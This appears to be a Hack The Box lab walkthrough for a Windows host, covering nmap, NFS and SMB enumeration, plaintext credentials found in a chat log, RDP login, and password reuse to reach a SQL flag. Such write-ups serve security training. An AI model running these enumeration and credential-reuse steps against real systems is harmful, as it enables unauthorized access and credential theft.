```
└─$ sudo nmap -T5 10.129.202.41           
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-24 20:47 EDT
Nmap scan report for 10.129.202.41
Host is up (0.056s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE
111/tcp  open  rpcbind
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs
3389/tcp open  ms-wbt-server
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WINMEDIUM


```

RDP doesn't seem useful need a Kerberos ticket for authentication.
Take a look at SMB on 445
## NFS
```
└─$ showmount -e 10.129.202.41                
Export list for 10.129.202.41:
/TechSupport (everyone)

```

It does not appear we can view the NFS share

![image](https://github.com/user-attachments/assets/9151d322-5a3b-49fb-802a-4d168cfe539d)


SMB map doesn't appear to find anything even using the provided credentials, going to use enum4linux next


NFS was able to work and found a file that was larger than the rest
```
Conversation with InlaneFreight Ltd

Started on November 10, 2021 at 01:27 PM London time GMT (GMT+0200)
---
01:27 PM | Operator: Hello,. 
 
So what brings you here today?
01:27 PM | alex: hello
01:27 PM | Operator: Hey alex!
01:27 PM | Operator: What do you need help with?
01:36 PM | alex: I run into an issue with the web config file on the system for the smtp server. do you mind to take a look at the config?
01:38 PM | Operator: Of course
01:42 PM | alex: here it is:

 1smtp {
 2    host=smtp.web.dev.inlanefreight.htb
 3    #port=25
 4    ssl=true
 5    user="alex"
 6    password="lol123!mD"
 7    from="alex.g@web.dev.inlanefreight.htb"
 8}
 9
10securesocial {
11    
12    onLoginGoTo=/
13    onLogoutGoTo=/login
14    ssl=false
15    
16    userpass {      
17      withUserNameSupport=false
18      sendWelcomeEmail=true
19      enableGravatarSupport=true
20      signupSkipLogin=true
21      tokenDuration=60
22      tokenDeleteInterval=5
23      minimumPasswordLength=8
24      enableTokenJob=true
25      hasher=bcrypt
26      }
27
28     cookie {
29     #       name=id
30     #       path=/login
31     #       domain="10.129.2.59:9500"
32            httpOnly=true
33            makeTransient=false
34            absoluteTimeoutInMinutes=1440
35            idleTimeoutInMinutes=1440
36    }   

```

Lets see if we can RDP now
`sudo xfreerdp /v:10.129.202.41 /u:alex /p:'lol123!mD' /cert:ignore /d:WINMEDIUM /dynamic-resolution`

with that we have RDP access to the host now to find passwords in the SQL server I believe based on the hint 
"In SQL Management Studio, we can edit the last 200 entries of the selected database and read the entries accordingly. We also need to keep in mind, that each Windows system has an Administrator account"

It appears we need an alternative user SA does not appear to be the user for 
![image](https://github.com/user-attachments/assets/cda2d9ab-b51c-4460-84c5-3e2babe4d70c)

Let's enumerate SMB instead

`enum4linux -a -u "alex" -p "lol123!mD" 10.129.202.41`
`crackmapexec smb 10.129.202.41 --shares -u 'alex' -p 'lol123!mD' -d 'WINMEDIUM'`

```
┌──(kali㉿kali)-[~/Downloads]
└─$ crackmapexec smb 10.129.202.41 --shares -u 'alex' -p 'lol123!mD' -d 'WINMEDIUM'
SMB         10.129.202.41   445    WINMEDIUM        [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINMEDIUM) (domain:WINMEDIUM) (signing:False) (SMBv1:False)
SMB         10.129.202.41   445    WINMEDIUM        [+] WINMEDIUM\alex:lol123!mD 
SMB         10.129.202.41   445    WINMEDIUM        [+] Enumerated shares
SMB         10.129.202.41   445    WINMEDIUM        Share           Permissions     Remark
SMB         10.129.202.41   445    WINMEDIUM        -----           -----------     ------
SMB         10.129.202.41   445    WINMEDIUM        ADMIN$                          Remote Admin
SMB         10.129.202.41   445    WINMEDIUM        C$                              Default share
SMB         10.129.202.41   445    WINMEDIUM        devshare        READ,WRITE      
SMB         10.129.202.41   445    WINMEDIUM        IPC$            READ            Remote IPC
SMB         10.129.202.41   445    WINMEDIUM        Users           READ            
                                                                                                                                                                   
┌──(kali㉿kali)-[~/Downloads]
└─$ 

```

devshare has read-write permissions
`smbclient -U alex \\\\10.129.202.41\\devshare`
![image](https://github.com/user-attachments/assets/214db3df-749e-4c2f-b450-3ddd2b45d657)
we now have the sa creds
![image](https://github.com/user-attachments/assets/4af21542-3ed6-4f86-91be-b02384a0bf63)
sa:87N1ns@slls83

It appears sa does not match that password. Keep in mind the hint is We also need to keep in mind, that each Windows system has an Administrator account. so let's test for password reuse.
I Ran SQL as admin with the creds above and the program opened. and connected to the database

![image](https://github.com/user-attachments/assets/08489cc0-457a-490c-aebe-027e6ada05ba)

Found a table and created a query to find HTB user in the table, which has our flag.
![image](https://github.com/user-attachments/assets/c7ee98bb-ebfe-4273-946f-747808d1f8b7)
